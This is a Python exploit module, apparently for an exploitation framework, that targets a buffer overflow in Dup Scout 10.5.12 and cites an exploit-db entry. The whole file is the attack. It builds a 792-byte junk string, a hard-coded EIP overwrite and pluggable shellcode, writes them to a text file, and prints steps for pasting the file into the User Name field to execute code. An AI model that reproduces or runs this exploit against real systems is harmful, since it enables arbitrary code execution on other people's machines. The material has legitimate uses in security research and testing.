from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    def __init__(self):
        info = {"Name": "Dup Scout Buffer Overflow",
                "Module Author": "Josue Encinar",
                "Exploit Author": "bzyo",
                "Description": "Dup Scout 10.5.12 Buffer Overflow",
                "Reference": "https://www.exploit-db.com/exploits/44244/",
                "Arch": "X86"
                }
        options = {
            "file": ["File to dump payload", "files/output/dupscout.txt", False]
        }
        compatible = ["local/windows/x86/calc"]
        super(BoomerModule, self).__init__(options, info, compatible)

    def run(self):
        junk = "A" * 792
        eip = "\x44\x11\x02\x10"
        fill = "\x43" * 560
        if self.payload is None:
            self.print_info("put payload")
            return
        payload = self.payload.get_shellcode()
        buffer = junk + eip + payload + fill
        try:
            with open(self.options["file"][1], 'w') as textfile:
                textfile.write(buffer)
            self.print_ok(f'{self.options["file"][1]} generated')
            self.print_info("""1. Open Dup Scout
            2. Select server, and connect
            3. Write anyting into Share Name
            4. Copy file content into User Name
            5. Click Connect and OK --> Code executed""")
        except Exception as e:
            self.print_error(e)
